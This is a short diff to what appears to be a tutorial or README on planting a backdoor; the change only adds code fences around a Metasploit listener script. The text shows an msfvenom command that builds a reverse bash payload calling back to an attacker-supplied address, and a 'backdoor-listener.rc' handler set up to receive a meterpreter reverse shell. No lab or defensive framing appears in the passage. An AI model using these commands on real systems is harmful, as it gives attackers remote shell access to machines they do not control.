@@ -34,11 +34,13 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<my_global_ip> LPORT=<my_global_port> -f
 
 **3) Metasploit listener script.** On your attack machine, add following file (edit contents as needed) and save it as 'backdoor-listener.rc'
 
+```
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
 set lhost <my_local_ip>
 set lport <my_local_port>
 exploit
+```
 
 This is a metasploit script file we will utilize later. Please pay attention to `<my_local_ip>` and `<my_local_port>` values above.
 
